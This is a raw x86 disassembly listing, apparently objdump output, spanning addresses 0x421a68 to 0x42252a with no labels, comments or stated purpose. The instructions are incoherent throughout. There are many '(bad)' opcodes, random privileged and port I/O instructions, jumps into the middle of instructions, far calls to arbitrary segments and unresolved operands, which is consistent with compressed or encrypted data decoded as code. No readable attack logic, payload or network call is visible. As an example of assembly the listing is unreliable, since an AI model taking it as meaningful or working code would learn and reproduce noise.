  421a68:	xchg   ecx,eax
  421a69:	shl    BYTE PTR [ecx-0x939fccf],1
  421a6f:	cmp    DWORD PTR fs:[eax],esi
  421a72:	mov    eax,ds:0x7a653ba1
  421a77:	mov    bl,0x78
  421a79:	jno    0x421a47
  421a7b:	pop    esp
  421a7c:	out    dx,al
  421a7d:	pop    esi
  421a7e:	in     eax,dx
  421a7f:	je     0x421a2a
  421a81:	mov    ebp,0x222c56f2
  421a86:	(bad)  
  421a87:	into   
  421a88:	xchg   ecx,eax
  421a89:	dec    edx
  421a8a:	std    
  421a8b:	xor    BYTE PTR [ebp-0x13],0x6e
  421a8f:	fadd   QWORD PTR [eax-0x3722f196]
  421a95:	push   ds
  421a96:	outs   dx,DWORD PTR ds:[esi]
  421a97:	adc    eax,0x34afc410
  421a9c:	ret    
  421a9d:	mov    ds:0xed8e055b,eax
  421aa2:	adc    DWORD PTR [ebx-0x3a2da1a7],edx
  421aa8:	pop    edx
  421aa9:	dec    esp
  421aaa:	(bad)  
  421aab:	xor    eax,0x5c6f39c2
  421ab0:	cli    
  421ab1:	jmp    0x421a7f
  421ab3:	mov    ebp,0xf062f684
  421ab8:	mov    ds:0x12f98166,eax
  421abd:	xchg   edx,eax
  421abe:	mov    al,ds:0xb7b08346
  421ac3:	out    dx,al
  421ac4:	and    al,dl
  421ac6:	(bad)  
  421ac8:	add    DWORD PTR [edx],0x16
  421acb:	ss mov edi,0xc1137ebb
  421ad1:	stos   DWORD PTR es:[edi],eax
  421ad2:	dec    bp
  421ad4:	mov    ebp,0xb739d579
  421ad9:	hlt    
  421ada:	inc    ebx
  421adb:	mov    dl,0x48
  421add:	ret    
  421ade:	(bad)  
  421adf:	sar    edi,1
  421ae1:	mov    dh,0x70
  421ae3:	fisubr DWORD PTR [esi]
  421ae5:	(bad)  
  421ae6:	leave  
  421ae7:	ror    eax,0xe4
  421aea:	test   eax,0x44b44e2e
  421aef:	mov    dh,0xcb
  421af1:	or     cl,BYTE PTR [eax]
  421af3:	(bad)  
  421af5:	out    dx,al
  421af6:	ins    DWORD PTR es:[edi],dx
  421af7:	cmp    al,0x22
  421af9:	or     BYTE PTR [ecx+esi*4+0x28],ah
  421afd:	and    eax,0x5a207eb1
  421b02:	push   ecx
  421b03:	add    BYTE PTR [ecx-0x69],bl
  421b06:	test   al,0xb9
  421b08:	sub    eax,0xf92db377
  421b0d:	les    esp,FWORD PTR [ebx+0x18]
  421b10:	fwait
  421b11:	add    al,BYTE PTR [edi-0x5b]
  421b14:	lds    ecx,FWORD PTR [eax]
  421b16:	pop    ds
  421b17:	dec    DWORD PTR [eax+0x6793833e]
  421b1d:	(bad)  
  421b1e:	into   
  421b1f:	fnclex 
  421b21:	test   bh,bl
  421b23:	mov    BYTE PTR [eax],al
  421b25:	jbe    0x421afc
  421b27:	and    eax,0xc5114c37
  421b2c:	and    edx,ebx
  421b2e:	mov    ebp,0xf675282a
  421b33:	das    
  421b34:	cmp    dh,BYTE PTR ds:0x647763f3
  421b3a:	call   0xb10bca2
  421b3f:	jle    0x421bab
	...
  421bb1:	add    BYTE PTR [eax],al
  421bb3:	add    BYTE PTR [edx-0x604ef4eb],cl
  421bb9:	mov    edi,0x2d6a3fba
  421bbe:	scas   al,BYTE PTR es:[edi]
  421bbf:	sub    ebp,esi
  421bc1:	mov    bl,0xdc
  421bc3:	cwde   
  421bc4:	test   eax,0xf5000168
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [esi+esi*1-0x27],ch
  421bcf:	dec    ebx
  421bd0:	stos   BYTE PTR es:[edi],al
  421bd1:	add    dh,BYTE PTR ds:[ebx]
  421bd4:	push   ecx
  421bd5:	outs   dx,BYTE PTR ds:[esi]
  421bd6:	xchg   ebx,eax
  421bd7:	int3   
  421bd8:	stos   BYTE PTR es:[edi],al
  421bd9:	imul   ecx,DWORD PTR [edi-0x68],0xffffffed
  421bdd:	sbb    BYTE PTR [ebx+ebx*2-0x318d3617],dl
  421be4:	ret    0x7f8c
  421be7:	jbe    0x421be8
  421be9:	push   ds
  421bea:	xor    bh,BYTE PTR [esi]
  421bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bed:	es int 0x4
  421bf0:	jnp    0x421b83
  421bf2:	mov    bh,0xa1
  421bf4:	dec    ebp
  421bf5:	cmc    
  421bf6:	inc    ecx
  421bf7:	imul   BYTE PTR [ebp+0x2b]
  421bfa:	nop
  421bfb:	pop    ecx
  421bfc:	inc    ecx
  421bfd:	push   0x7f
  421bff:	xchg   edi,eax
  421c00:	icebp  
  421c01:	add    eax,0x48f3dff
  421c06:	sub    BYTE PTR [ebx],0x13
  421c09:	sahf   
  421c0a:	lock pop ebx
  421c0c:	imul   ebp,DWORD PTR [esi],0xfffffffd
  421c0f:	jle    0x421bbb
  421c11:	data16 jb 0x421c80
  421c14:	jmp    0x421c93
  421c16:	ss mov bh,0x4
  421c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c1a:	arpl   di,ax
  421c1c:	das    
  421c1d:	xchg   BYTE PTR [ebx+0x7],ch
  421c20:	inc    esp
  421c21:	aas    
  421c22:	cmp    eax,0x9e9e69dd
  421c27:	iret   
  421c28:	cmp    BYTE PTR ds:0x97f2f728,0x63
  421c2f:	jnp    0x421c16
  421c31:	lds    eax,FWORD PTR [eax+0x76706ba9]
  421c37:	daa    
  421c38:	js     0x421c98
  421c3a:	in     eax,dx
  421c3b:	fild   QWORD PTR [ebp-0x49]
  421c3e:	jp     0x421bd9
  421c40:	(bad)  
  421c43:	cmp    ah,BYTE PTR [eax-0x12]
  421c46:	ins    DWORD PTR es:[edi],dx
  421c47:	fwait
  421c48:	scas   eax,DWORD PTR es:[edi]
  421c49:	jb     0x421c35
  421c4b:	or     al,0x5f
  421c4d:	call   0x1a44:0x211adced
  421c54:	xchg   ebp,eax
  421c55:	cdq    
  421c56:	stc    
  421c57:	ins    BYTE PTR es:[edi],dx
  421c58:	dec    ecx
  421c59:	inc    edx
  421c5a:	fsub   QWORD PTR [esi+0x129ebff8]
  421c60:	push   edx
  421c61:	pop    eax
  421c62:	xor    al,0x4a
  421c64:	leave  
  421c65:	fcmovnbe st,st(1)
  421c67:	adc    DWORD PTR [edi],eax
  421c69:	aad    0x5f
  421c6b:	inc    esp
  421c6c:	or     esi,DWORD PTR [ebx]
  421c6e:	cmp    DWORD PTR [ecx-0x40],edi
  421c71:	test   eax,0x4bc92d5b
  421c76:	mov    al,0x49
  421c78:	pop    ebp
  421c79:	loop   0x421c91
  421c7b:	sub    dl,dl
  421c7d:	or     DWORD PTR [edi],eax
  421c7f:	jmp    0x2796d8df
  421c84:	mov    ?,edx
  421c86:	lock add esi,DWORD PTR [edx]
  421c89:	pop    ds
  421c8a:	add    BYTE PTR [edx],bh
  421c8c:	ja     0x421c74
  421c8e:	xchg   ecx,eax
  421c8f:	inc    edx
  421c90:	les    esi,FWORD PTR [eax-0xedb2d93]
  421c96:	not    ch
  421c98:	sub    DWORD PTR ds:0x1132758,ebp
  421c9e:	or     al,0x60
  421ca0:	mov    ecx,0x4b7ad943
  421ca5:	into   
  421ca6:	cmp    BYTE PTR [ebp+ecx*2+0x5d],0x58
  421cab:	inc    esp
  421cac:	jge    0x421c6a
  421cae:	test   BYTE PTR [esi-0x351c743],bh
  421cb4:	ret    0xf0a1
  421cb7:	fdivr  DWORD PTR [esi-0x46f0dec8]
  421cbd:	cmp    al,0xdf
  421cbf:	xchg   ecx,eax
  421cc0:	call   0x0:0x0
	...
  421d33:	add    bh,ah
  421d35:	push   ds
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	iret   
  421d41:	lds    eax,FWORD PTR [ecx+0x56]
  421d44:	sahf   
  421d45:	imul   eax,DWORD PTR [ecx],0xf500
  421d4b:	add    bh,cl
  421d4d:	ffree  st(5)
  421d4f:	fisub  DWORD PTR [edx+0x2a]
  421d52:	adc    esi,edx
  421d54:	xlat   BYTE PTR ds:[ebx]
  421d55:	call   esp
  421d57:	or     DWORD PTR [ebx],edi
  421d59:	(bad)  
  421d5a:	mov    ds:0x12b3140e,eax
  421d5f:	jb     0x421dc7
  421d61:	sbb    DWORD PTR [ecx],esi
  421d63:	pusha  
  421d64:	popf   
  421d65:	cld    
  421d66:	xchg   ecx,eax
  421d67:	dec    eax
  421d68:	jns    0x421dba
  421d6a:	push   ecx
  421d6b:	(bad)  
  421d6c:	push   edx
  421d6d:	pop    ebx
  421d6e:	stos   BYTE PTR es:[edi],al
  421d6f:	inc    esp
  421d70:	cli    
  421d71:	mov    eax,0x8dd4b225
  421d76:	cmp    ah,ch
  421d78:	adc    eax,0x7bda85c2
  421d7d:	add    dh,BYTE PTR [edi-0x239ac823]
  421d83:	cwde   
  421d84:	mov    DWORD PTR [ebp-0x441b763c],ebp
  421d8a:	ja     0x421d38
  421d8c:	imul   edi,eax,0x28
  421d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d90:	xchg   esi,eax
  421d91:	in     al,0xc0
  421d93:	jno    0x421d96
  421d95:	xor    al,0x4a
  421d97:	enter  0xe698,0x53
  421d9b:	pop    ds
  421d9c:	cwde   
  421d9d:	test   al,0xe
  421d9f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  421da1:	jno    0x421d79
  421da3:	cli    
  421da4:	fcmovnbe st,st(3)
  421da6:	add    eax,0x26d26eae
  421dab:	push   0xae94de3d
  421db0:	(bad)  
  421db1:	fstp   TBYTE PTR [edx]
  421db3:	ds inc esp
  421db5:	mov    edx,0xf8f4e30a
  421dba:	leave  
  421dbb:	adc    bl,BYTE PTR [eax]
  421dbd:	add    eax,0x4fc781e1
  421dc2:	add    edi,DWORD PTR [edx-0x73]
  421dc5:	and    DWORD PTR [edx+0x1e],ebx
  421dc8:	pop    es
  421dc9:	sub    dh,bh
  421dcb:	mov    BYTE PTR [ebp+0x3d],dh
  421dce:	in     eax,0xc8
  421dd0:	xchg   edi,eax
  421dd1:	dec    ebp
  421dd2:	dec    eax
  421dd3:	ins    DWORD PTR es:[edi],dx
  421dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dd5:	jb     0x421e0f
  421dd7:	xchg   BYTE PTR [eax],cl
  421dd9:	dec    eax
  421dda:	(bad)  
  421ddb:	xor    bh,BYTE PTR [edi+0x598f96c]
  421de1:	cmp    eax,0x3b4f5eb7
  421de6:	shl    DWORD PTR [ecx],1
  421de8:	test   al,0x3a
  421dea:	pop    edx
  421deb:	xor    al,bh
  421ded:	push   edi
  421dee:	add    DWORD PTR [esi+ebx*8+0x43],ebx
  421df2:	push   edx
  421df3:	pop    ecx
  421df4:	inc    ecx
  421df5:	loopne 0x421e25
  421df7:	cmp    eax,0xc01dd687
  421dfc:	cmp    eax,0x7ccaf22b
  421e01:	push   0x326dfd91
  421e06:	dec    ebx
  421e07:	pop    edx
  421e08:	sub    al,0x5d
  421e0a:	dec    ebp
  421e0b:	pop    eax
  421e0c:	mov    bh,0x25
  421e0e:	push   ebp
  421e0f:	(bad)  
  421e11:	icebp  
  421e12:	pop    esi
  421e13:	mov    ds:0x9001977a,eax
  421e18:	js     0x421e7a
  421e1a:	push   ebp
  421e1b:	jno    0x421e3c
  421e1d:	mov    ds:0xa1e98f9d,eax
  421e22:	cmp    DWORD PTR [edx+0x53],edi
  421e25:	not    DWORD PTR [edx-0x57bc5d4a]
  421e2b:	sbb    eax,0x1e1ac83a
  421e30:	jae    0x421db9
  421e32:	fisub  WORD PTR [ecx]
  421e34:	sbb    ecx,DWORD PTR [esi]
  421e36:	fisttp WORD PTR [edx+0x11]
  421e39:	mov    cl,0x80
  421e3b:	and    bh,bl
  421e3d:	mov    ds:0xe5220a,al
	...
  421eb2:	add    BYTE PTR [eax],al
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421e7c
  421ec1:	push   ds
  421ec2:	or     ah,BYTE PTR [ebx]
  421ec4:	xchg   ebx,eax
  421ec5:	push   0x1
  421ec7:	add    ch,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    BYTE PTR [eax-0x7af0b425],dh
  421ed1:	retf   0x870d
  421ed4:	xor    eax,0x7975b1d8
  421ed9:	cmp    eax,0x4d5d168c
  421ede:	cwde   
  421edf:	test   dh,0xf2
  421ee2:	jbe    0x421e9e
  421ee4:	or     DWORD PTR [ebx-0x17],esi
  421ee7:	mov    al,ds:0x1a10aec2
  421eec:	out    0xbb,al
  421eee:	jae    0x421f3e
  421ef0:	cmp    al,0x6
  421ef2:	iret   
  421ef3:	jnp    0x421eb4
  421ef5:	sub    BYTE PTR [ebx+0x7d45fe],0xe5
  421efc:	sbb    DWORD PTR [edx],ecx
  421efe:	out    dx,al
  421eff:	push   esi
  421f00:	add    ebp,DWORD PTR [edx]
  421f02:	ds mov al,0xd5
  421f05:	and    eax,0x9e041ed7
  421f0a:	mov    cl,0x4
  421f0c:	popf   
  421f0d:	cmp    DWORD PTR ds:0xd5db778,edi
  421f13:	cdq    
  421f14:	sar    eax,cl
  421f16:	mov    al,ds:0x88e569f5
  421f1b:	mov    ebx,0xad1bdbb7
  421f20:	dec    ebx
  421f21:	fcomp  QWORD PTR [eax]
  421f23:	lds    edi,FWORD PTR [edx+ecx*2-0x68f2b1b2]
  421f2a:	and    ah,BYTE PTR [ecx]
  421f2c:	jecxz  0x421f46
  421f2e:	dec    ecx
  421f2f:	push   cs
  421f30:	pop    edx
  421f31:	rcl    BYTE PTR [esi+0x35f13ba4],cl
  421f37:	jmp    0x14933a64
  421f3c:	mov    ch,0xd0
  421f3e:	jg     0x421f70
  421f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f41:	push   edx
  421f42:	cmp    DWORD PTR [ebx-0x5f051884],esp
  421f48:	jge    0x421f86
  421f4a:	leave  
  421f4b:	out    dx,eax
  421f4c:	mov    edx,0xb07f4485
  421f51:	mov    bl,0xac
  421f53:	dec    esi
  421f54:	sub    ch,BYTE PTR [edi-0x3098969]
  421f5a:	scas   eax,DWORD PTR es:[edi]
  421f5b:	mov    bh,0x50
  421f5d:	sub    ebp,DWORD PTR [edx+0x39cca318]
  421f63:	pop    esp
  421f64:	fwait
  421f65:	inc    eax
  421f66:	inc    eax
  421f67:	fwait
  421f68:	jno    0x421fbe
  421f6a:	xor    bl,BYTE PTR [edi]
  421f6c:	shl    bl,1
  421f6e:	outs   dx,DWORD PTR ds:[esi]
  421f6f:	fsubp  st(2),st
  421f71:	mov    cl,0x2c
  421f73:	cmp    bl,BYTE PTR [edi+0x1fba8647]
  421f79:	push   ds
  421f7a:	std    
  421f7b:	ficom  DWORD PTR [eax+0x3785f935]
  421f81:	mov    ecx,0xbffe68d6
  421f86:	fwait
  421f87:	mov    bl,0x2
  421f89:	cmc    
  421f8a:	icebp  
  421f8b:	and    BYTE PTR [ebp-0x32],0x5d
  421f8f:	(bad)  
  421f90:	sub    eax,0x816b8d5e
  421f95:	test   DWORD PTR [ebx+0x32],ebx
  421f98:	mov    dh,dl
  421f9a:	call   0x43188842
  421f9f:	sbb    DWORD PTR [esi-0x1d],eax
  421fa2:	xchg   ebp,eax
  421fa3:	mov    edi,0xe49714e5
  421fa8:	repnz loope 0x42201f
  421fab:	retf   0x9367
  421fae:	mov    dl,0x2c
  421fb0:	lahf   
  421fb1:	aad    0xd9
  421fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fb4:	mov    al,ds:0xaf792e81
  421fb9:	add    DWORD PTR [ecx],ebx
  421fbb:	ins    BYTE PTR es:[edi],dx
  421fbc:	sub    DWORD PTR [edx],esi
  421fbe:	or     edx,esi
  421fc0:	or     al,0x0
	...
  422032:	add    BYTE PTR [eax],al
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x8c4f082b
  422044:	mov    BYTE PTR [ebx+0x1],ch
  422047:	add    ch,dh
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR ds:0x989fcbd3,al
  422051:	aam    0xe8
  422053:	adc    dh,BYTE PTR [ecx]
  422055:	and    al,0xfa
  422057:	fwait
  422058:	stc    
  422059:	not    BYTE PTR [edi+0x184fecad]
  42205f:	(bad)  
  422060:	jge    0x422028
  422062:	dec    edi
  422063:	std    
  422064:	push   ds
  422065:	mov    eax,0x56a71185
  42206a:	xchg   edx,eax
  42206b:	(bad)  
  42206c:	jge    0x4220c8
  42206e:	in     al,dx
  42206f:	cmp    BYTE PTR [eax-0x71],dl
  422072:	or     BYTE PTR [eax-0x64],bh
  422075:	popa   
  422076:	push   ebp
  422077:	jo     0x4220da
  422079:	iret   
  42207a:	and    DWORD PTR [edx-0x6bef6b34],0xb1328417
  422084:	jmp    0x3a36:0x98b56975
  42208b:	xor    eax,0x7d7f0370
  422090:	mov    dh,0x76
  422092:	pop    esi
  422093:	mov    bh,0x23
  422095:	pop    edi
  422096:	imul   esi,DWORD PTR [ecx],0xdf390964
  42209c:	iret   
  42209d:	sbb    ebx,esp
  42209f:	imul   ebx,DWORD PTR [ecx+0xb],0xffffffcd
  4220a3:	xlat   BYTE PTR ds:[ebx]
  4220a4:	(bad)  
  4220a5:	push   0x25
  4220a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220a8:	xchg   ebx,eax
  4220a9:	mov    dl,BYTE PTR [ebp-0x6be98958]
  4220af:	ins    DWORD PTR es:[edi],dx
  4220b0:	push   cs
  4220b1:	xchg   ecx,eax
  4220b2:	mov    BYTE PTR [ebx-0x40420159],al
  4220b8:	xchg   edi,eax
  4220b9:	adc    dh,BYTE PTR [ebx]
  4220bb:	jmp    0x4220a4
  4220bd:	push   ecx
  4220be:	sbb    ecx,DWORD PTR [edx-0x42]
  4220c1:	push   ds
  4220c2:	inc    ebp
  4220c3:	scas   eax,DWORD PTR es:[di]
  4220c5:	lods   eax,DWORD PTR ds:[esi]
  4220c6:	inc    ecx
  4220c7:	push   cs
  4220c8:	sti    
  4220c9:	mov    esp,0x785c6b9b
  4220ce:	or     esi,DWORD PTR [ecx-0x37]
  4220d1:	and    eax,DWORD PTR [ebx]
  4220d3:	push   0x6a8f93f
  4220d8:	xor    eax,0x4d658b74
  4220dd:	dec    edx
  4220de:	push   0x5d
  4220e0:	pop    ss
  4220e1:	inc    ebp
  4220e2:	lahf   
  4220e3:	sbb    eax,0x5b57cd02
  4220e8:	dec    esp
  4220e9:	sub    al,0x8e
  4220eb:	lods   al,BYTE PTR ds:[esi]
  4220ec:	mov    ecx,0x7a974e8d
  4220f1:	inc    esi
  4220f2:	ficom  WORD PTR ds:0xb506e623
  4220f8:	(bad)  
  4220f9:	add    DWORD PTR [ebx+0x364846e9],edx
  4220ff:	add    dh,BYTE PTR [edx]
  422101:	jbe    0x422102
  422103:	sbb    ebp,esi
  422105:	jge    0x422121
  422107:	mov    BYTE PTR [esi],cl
  422109:	jmp    0x197c:0x219870f
  422110:	mov    ebx,0x7a107c8c
  422115:	dec    ebp
  422116:	add    bx,di
  422119:	jae    0x422148
  42211b:	cmc    
  42211c:	into   
  42211d:	aas    
  42211e:	and    al,0x31
  422120:	popa   
  422121:	int    0x62
  422123:	jp     0x422118
  422125:	test   DWORD PTR gs:[edi-0x20f64dd3],ecx
  42212c:	not    BYTE PTR [ebx-0x1c]
  42212f:	dec    edx
  422130:	jecxz  0x42218d
  422132:	ss pop ss
  422134:	sub    al,0xac
  422136:	out    dx,al
  422137:	into   
  422138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422139:	jecxz  0x4220e7
  42213b:	add    edi,DWORD PTR [esi+0x2cce4969]
	...
  4221b1:	add    BYTE PTR [eax],al
  4221b3:	add    BYTE PTR [esi-0x700870e1],bl
  4221b9:	idiv   esi
  4221bb:	jg     0x4221f8
  4221bd:	data16 daa 
  4221bf:	aad    0x0
  4221c1:	les    edx,FWORD PTR [edi+0x61]
  4221c4:	jge    0x422232
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	cmc    
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [esi],ch
  4221cd:	xor    BYTE PTR [eax],dh
  4221cf:	leave  
  4221d0:	pusha  
  4221d1:	pop    esi
  4221d2:	pop    edx
  4221d3:	leave  
  4221d4:	imul   eax,DWORD PTR [eax+ebx*2+0x5f],0xffffffe2
  4221d9:	add    eax,0xbd3a9875
  4221de:	mov    ebx,0x945527de
  4221e3:	sbb    eax,0x6cb53ad6
  4221e8:	in     al,0xbf
  4221ea:	xchg   ebp,eax
  4221eb:	inc    edi
  4221ec:	sbb    dl,ch
  4221ee:	pop    ebp
  4221ef:	(bad)  [ebx+edx*4+0x3fe0cbdf]
  4221f6:	and    esp,ebp
  4221f8:	(bad)  
  4221f9:	imul   esi,DWORD PTR [edx+0x3e],0x978bf4bd
  422200:	jmp    0xbc57:0x2503e847
  422207:	xchg   edx,eax
  422208:	call   0x250e:0xe5f4992e
  42220f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422210:	mov    cl,0x10
  422212:	mov    bh,0xb6
  422214:	cmp    BYTE PTR [eax],0x5e
  422217:	mov    eax,ds:0x3e07d4e4
  42221c:	mov    ebp,0xe40bf5f9
  422221:	push   eax
  422222:	(bad)  
  422223:	in     eax,dx
  422224:	sbb    al,0xa
  422226:	mov    ecx,0x78a79dbc
  42222b:	mov    ch,0x40
  42222d:	adc    DWORD PTR [esi-0x2a],esp
  422230:	lea    esp,[edi+0x5d]
  422233:	ins    DWORD PTR es:[edi],dx
  422234:	retf   0x995b
  422237:	lods   al,BYTE PTR ds:[esi]
  422238:	and    BYTE PTR [edx],dh
  42223a:	pop    ds
  42223b:	retf   0x87c1
  42223e:	or     DWORD PTR [esi],0xffffffef
  422241:	add    edx,esp
  422243:	sub    al,0x47
  422245:	adc    edx,esi
  422247:	ja     0x42228f
  422249:	int3   
  42224a:	dec    esi
  42224b:	ja     0x42220b
  42224d:	push   esi
  42224e:	ret    
  42224f:	jnp    0x4221fb
  422251:	jmp    0x422282
  422253:	dec    esi
  422254:	sbb    WORD PTR [eax],0xffcc
  422258:	xchg   edi,eax
  422259:	aad    0xc
  42225b:	sar    BYTE PTR [ecx+0x6d11e7f0],1
  422261:	add    eax,0x60834ecb
  422266:	push   eax
  422267:	mov    esp,?
  422269:	lock pop edx
  42226b:	adc    ah,BYTE PTR [ecx]
  42226d:	fld    DWORD PTR [ecx]
  42226f:	repz test DWORD PTR [ebx-0x2bf41424],0x3bde7b0
  42227a:	push   0x3
  42227c:	and    eax,0x64af9140
  422281:	inc    ebp
  422282:	push   esp
  422283:	lods   eax,DWORD PTR ds:[esi]
  422284:	mov    esi,0xb9648b83
  422289:	lahf   
  42228a:	dec    ebp
  42228b:	sbb    eax,0x484e921a
  422290:	add    DWORD PTR [edx-0x6f],esp
  422293:	mul    DWORD PTR [edi+0x15be4f77]
  422299:	scas   al,BYTE PTR es:[edi]
  42229a:	loopne 0x422309
  42229c:	aaa    
  42229d:	jne    0x4222f1
  42229f:	ret    0xa61a
  4222a2:	loop   0x42222e
  4222a4:	adc    dl,bl
  4222a6:	mov    ds,WORD PTR [ebp-0x4b]
  4222a9:	fldenv [ecx-0x2e]
  4222ac:	lods   eax,DWORD PTR ds:[esi]
  4222ad:	xchg   DWORD PTR [esi+edi*1-0x7d],eax
  4222b1:	lahf   
  4222b2:	mov    eax,0x6c733c9e
  4222b7:	(bad)  
  4222b8:	pop    ds
  4222b9:	sub    eax,0x2a0fe26e
  4222be:	imul   esi,esi,0x3a
	...
  422331:	add    BYTE PTR [eax],al
  422333:	add    dh,bh
  422335:	(bad)  
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	outs   dx,BYTE PTR ds:[esi]
  422341:	sub    eax,0x6d727407
  422346:	add    DWORD PTR [eax],eax
  422348:	cmc    
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [ecx+eax*4+0x2c],cl
  42234f:	push   esp
  422350:	cmp    ebx,DWORD PTR [ebx+0x65607d03]
  422356:	mov    BYTE PTR [edx+0x123b8105],al
  42235c:	test   BYTE PTR [esi-0x9b27c24],bl
  422362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422363:	mov    DWORD PTR [esi],edi
  422365:	add    DWORD PTR ds:0x351acc18,0xffffffce
  42236c:	and    BYTE PTR [eax-0x5d835a20],0x20
  422373:	xor    eax,0xcc727b6
  422378:	fisttp WORD PTR [esi]
  42237a:	sbb    BYTE PTR [edi],dl
  42237c:	call   0x5a6c6c72
  422381:	pop    es
  422382:	(bad)  
  422383:	adc    al,0x3f
  422385:	pop    ebp
  422386:	call   0x806d59f
  42238b:	adc    eax,0x50b9c7ca
  422390:	nop/reserved BYTE PTR [edi+0x32]
  422394:	loope  0x422370
  422396:	add    DWORD PTR [ecx+0x8f06d94],ebp
  42239c:	jno    0x4223ae
  42239e:	ret    0xee4b
  4223a1:	fsubrp st(4),st
  4223a3:	sbb    al,0x91
  4223a5:	jns    0x4223a8
  4223a7:	jp     0x4223f1
  4223a9:	sbb    DWORD PTR [ecx+esi*1-0x4ecae504],ecx
  4223b0:	and    eax,0x2aeae110
  4223b5:	push   ss
  4223b6:	rcl    DWORD PTR [edi+0x56583909],0x46
  4223bd:	test   eax,0x6fb3d241
  4223c2:	sbb    al,0x7e
  4223c4:	xchg   edx,eax
  4223c5:	adc    al,0x4c
  4223c7:	lods   eax,DWORD PTR ds:[esi]
  4223c8:	cmp    bh,BYTE PTR [edx-0x26435225]
  4223ce:	mov    ds,WORD PTR [ecx]
  4223d0:	adc    al,0x7
  4223d2:	dec    ebp
  4223d3:	xor    ecx,DWORD PTR [ebp+0x4c4f928c]
  4223d9:	sbb    BYTE PTR [ecx-0x1b],ah
  4223dc:	sub    DWORD PTR [ebx+0x5c08c4f3],0xffffffd6
  4223e3:	pop    ss
  4223e4:	or     BYTE PTR [esi+0x53],bl
  4223e7:	push   ss
  4223e8:	stos   BYTE PTR es:[edi],al
  4223e9:	hlt    
  4223ea:	imul   ebp,DWORD PTR [edx-0x3e74c3ea],0x6a
  4223f1:	stc    
  4223f2:	aad    0x7e
  4223f4:	fs mov bl,0xd8
  4223f7:	(bad)  
  4223f8:	mov    al,0xe4
  4223fa:	xchg   ebx,eax
  4223fb:	dec    ebx
  4223fc:	dec    esi
  4223fd:	add    dl,BYTE PTR [ecx+0x6e67fb40]
  422403:	push   ebp
  422404:	sub    BYTE PTR [edx-0x75113817],bl
  42240a:	out    0xf3,al
  42240c:	ss jne 0x422418
  42240f:	jb     0x422394
  422411:	cmp    ebp,esp
  422413:	(bad)  
  422414:	scas   al,BYTE PTR es:[edi]
  422415:	xchg   DWORD PTR [edx-0xa922f57],ebp
  42241b:	jmp    0x853909b6
  422420:	mov    edi,0x9b6bd3c3
  422425:	mov    esi,0x623fd29d
  42242a:	rol    BYTE PTR [eax],0x75
  42242d:	jecxz  0x4223ec
  42242f:	pusha  
  422430:	std    
  422431:	and    DWORD PTR [ecx-0x35b9e403],ebp
  422437:	adc    BYTE PTR [ecx+0x46],0x3d
  42243b:	add    BYTE PTR [ebx-0xd],dh
  42243e:	retf   
  42243f:	pop    es
  422440:	xchg   ebx,eax
	...
  4224b1:	add    BYTE PTR [eax],al
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0xc6319f7c
  4224c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c3:	jp     0x42252c
  4224c5:	outs   dx,BYTE PTR ds:[esi]
  4224c6:	add    DWORD PTR [eax],eax
  4224c8:	cmc    
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [esi],bl
  4224cd:	xor    eax,0x30e23f20
  4224d2:	push   edi
  4224d3:	cwde   
  4224d4:	repnz mov DWORD PTR [edi+0x38af1560],0xa540b874
  4224df:	aas    
  4224e0:	(bad)  
  4224e1:	xor    ebp,ebx
  4224e3:	mov    gs,WORD PTR [esi-0x5]
  4224e6:	sti    
  4224e7:	(bad)  
  4224e8:	call   0xaec68923
  4224ed:	add    BYTE PTR [edi],ah
  4224ef:	mov    esp,0x2acab435
  4224f4:	mov    eax,ds:0x1ceadef2
  4224f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224fa:	js     0x42252f
  4224fc:	push   edi
  4224fd:	dec    ebp
  4224fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ff:	aas    
  422500:	imul   esi,DWORD PTR [eax-0x24451a06],0xd06637f1
  42250a:	adc    ch,BYTE PTR [ecx-0x60]
  42250d:	div    BYTE PTR [ecx-0x74713648]
  422513:	dec    esp
  422514:	push   ds
  422515:	hlt    
  422516:	ret    0xe1f1
  422519:	fld    st(7)
  42251b:	pop    esi
  42251c:	mov    ch,0x64
  42251e:	and    BYTE PTR [edi],cl
  422520:	ret    
  422521:	shl    BYTE PTR [esi],1
  422523:	jecxz  0x4224be
  422525:	add    DWORD PTR [eax],0xffffff94
  422528:	dec    edx
  422529:	push   ebp
  42252a:	add    DWORD PTR [esi],esi
